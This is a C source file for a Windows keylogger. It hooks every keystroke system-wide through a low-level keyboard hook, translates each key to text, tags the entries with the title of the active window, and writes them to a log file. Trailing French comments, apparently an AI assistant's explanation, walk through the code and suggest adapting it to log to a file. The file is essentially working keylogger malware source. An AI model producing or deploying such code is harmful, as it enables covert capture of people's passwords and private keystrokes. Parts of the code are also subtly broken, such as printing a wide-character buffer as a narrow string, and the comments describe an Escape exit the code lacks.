#include "winkey.h"

HHOOK   g_Hook    = NULL;
WCHAR   BUFFER[8] = {0};
DWORD   WinTmpID  = 0;

bool    Keylogger(void)
{
    if (SetupKeyHook() == false)
        return false;

    MSG     msg;

    while (GetMessage(&msg, NULL, 0, 0))        // Wait for event
    {
        TranslateMessage(&msg);                 // Translate event of virtual key to character
        DispatchMessage(&msg);                  // Send message to window, maybe not useful for us
    }
    

    RemoveKeyHook();

    return true;
}

LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
/*
    nCode  -> A code the hook procedure uses to determine how to process the message.
    wParam -> The virtual-key code of the key that generated the keystroke message
    lParam -> Pointer to a struct KBDLLHOOKSTRUCT
*/
{

    if (code >= 0)
    {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            HWND    FGWindow = GetForegroundWindow();
            
            if (FGWindow)
            {
                DWORD   WindowProcessID  = 0;
                char    windowTitle[256] = {0};

                GetWindowText(FGWindow, windowTitle, 256);
                
                GetWindowThreadProcessId(FGWindow, &WindowProcessID);

                if (WindowProcessID != WinTmpID)
                {
                    WinTmpID = WindowProcessID;
                    printf("\n--------[%s]--------\n", windowTitle);
                    fprintf(LogFile, "\n--------[%s]--------\n", windowTitle);
                }
            }


            KBDLLHOOKSTRUCT*    kb = (KBDLLHOOKSTRUCT *)lParam;
            DWORD   VirtualKeyCode = kb->vkCode;
            
            BYTE    keyboardState[256] = {0};
            GetKeyboardState(keyboardState);

            int res = ToUnicodeEx(VirtualKeyCode,
                                  kb->scanCode,
                                  keyboardState,
                                  BUFFER,
                                  2,
                                  0,
                                  GetKeyboardLayout(0));
            
            if (res == 0)
            {
                char* specialKey = NULL;
                switch (VirtualKeyCode)
                {
                    case VK_RETURN:    specialKey = _strdup("\n");    break;
                    case VK_BACK:      specialKey = _strdup("BACK");  break;
                    case VK_SPACE:     specialKey = _strdup(" ");     break;
                    case VK_TAB:       specialKey = _strdup("\t");    break;
                    case (VK_SHIFT):     specialKey = _strdup("SHIFT"); break;
                    case VK_CONTROL:   specialKey = _strdup("CTRL");  break;
                    case VK_LCONTROL:  specialKey = _strdup("LCTRL"); break;
                    case VK_RCONTROL:  specialKey = _strdup("RCTRL"); break;
                    case VK_LEFT:      specialKey = _strdup("LEFT");  break;
                    case VK_RIGHT:     specialKey = _strdup("RIGHT"); break;
                    case VK_UP:        specialKey = _strdup("UP");    break;
                    case VK_DOWN:      specialKey = _strdup("DOWN");  break;
                    case VK_DELETE:    specialKey = _strdup("DEL");   break;
                    case VK_INSERT:    specialKey = _strdup("INS");   break;
                    case VK_HOME:      specialKey = _strdup("HOME");  break;
                    case VK_END:       specialKey = _strdup("END");   break;
                    case VK_NEXT:      specialKey = _strdup("PGDN");  break;
                    case VK_ESCAPE:    specialKey = _strdup("ESC");   break;
                    case VK_CAPITAL:   specialKey = _strdup("CAPS");  break;
                    case VK_NUMLOCK:   specialKey = _strdup("NUMLOCK"); break;
                    case VK_F1:        specialKey = _strdup("F1");    break;
                    case VK_F2:        specialKey = _strdup("F2");    break;
                    case VK_F3:        specialKey = _strdup("F3");    break;
                    case VK_F4:        specialKey = _strdup("F4");    break;
                    case VK_F5:        specialKey = _strdup("F5");    break;
                    case VK_F6:        specialKey = _strdup("F6");    break;
                    case VK_F7:        specialKey = _strdup("F7");    break;
                    case VK_F8:        specialKey = _strdup("F8");    break;
                    case VK_F9:        specialKey = _strdup("F9");    break;
                    case VK_F10:       specialKey = _strdup("F10");   break;
                    case VK_F11:       specialKey = _strdup("F11");   break;
                    case VK_F12:       specialKey = _strdup("F12");   break;
                }

                if (specialKey != NULL)
                {
                    printf("|%s|", specialKey);
                    fprintf(LogFile, "|%s|", specialKey);
                    free(specialKey);
                }
            }

            else if (res > 0)
            {
                printf("%s", (const char *)BUFFER);
                fprintf(LogFile, "%s", (const char *)BUFFER);
            }
        }
    }

    return CallNextHookEx(g_Hook, code, wParam, lParam);
}

bool    SetupKeyHook(void)
{
    g_Hook = SetWindowsHookEx( WH_KEYBOARD_LL,         // Type of procedure
                               KeyboardProc,           // Callback function
                               GetModuleHandle(NULL),  // Used if callback function is in a .dll
                               0);                     // 0 Associate the callback to every thread
    if (g_Hook == NULL)
    {
        return false;
    }

    return true;
}

void    RemoveKeyHook(void)
{
    if (g_Hook != NULL)
    {
        UnhookWindowsHookEx(g_Hook);
        g_Hook = NULL;
    }
}

// SHIFT : 160
// ALT   : 164
// typedef struct tagMSG 
// {
//     HWND   hwnd;
//     UINT   message;
//     WPARAM wParam;
//     LPARAM lParam;
//     DWORD  time;
//     POINT  pt;
//     DWORD  lPrivate;
//
// }   MSG;


            
//             // Afficher le nom de la fenêtre active
//             HWND foregroundWindow = GetForegroundWindow();
//             if (foregroundWindow)
//             {
//                 char windowTitle[256] = {0};
//                 GetWindowTextA(foregroundWindow, windowTitle, 256);
//                 printf("Fenêtre active: %s\n", windowTitle);
//                 printf("---------------------------\n");
//             }


// ## Explications détaillées

// 1. **Vérification du code**
//    - `if (code >= 0)` : Ne traite que les codes valides

// 2. **Filtrage des événements clavier**
//    - `if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)` : Ne traite que les touches pressées, pas les relâchements

// 3. **Extraction des informations**
//    - `KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam` : Récupère les données de la touche
//    - `vkCode` contient le code de touche virtuelle

// 4. **Traduction du code virtuel en caractère**
//    - `WCHAR buffer[8]` : Buffer pour stocker les caractères résultants
//    - `GetKeyboardState()` : Récupère l'état actuel du clavier (touches modificatrices, etc.)
//    - `ToUnicodeEx()` : Convertit le code virtuel en caractères Unicode en tenant compte de la disposition du clavier

// 5. **Affichage du caractère ou de la touche spéciale**
//    - Si `ToUnicodeEx()` réussit : Affiche le caractère
//    - Sinon : Identifie et affiche le nom de la touche spéciale

// 6. **Affichage du contexte (fenêtre active)**
//    - `GetForegroundWindow()` : Obtient la fenêtre active
//    - `GetWindowTextA()` : Obtient le titre de cette fenêtre

// 7. **Mécanisme de sortie**
//    - Si Escape est pressé : Appelle `PostQuitMessage(0)` pour sortir de la boucle GetMessage

// Cette implémentation répond à votre besoin tout en offrant:
// - Un affichage propre dans le terminal
// - Une gestion des caractères et des touches spéciales
// - Le contexte de la fenêtre active
// - Une méthode pour quitter proprement le programme

// Vous pourrez facilement adapter ce code pour écrire dans un fichier log plutôt que sur le terminal.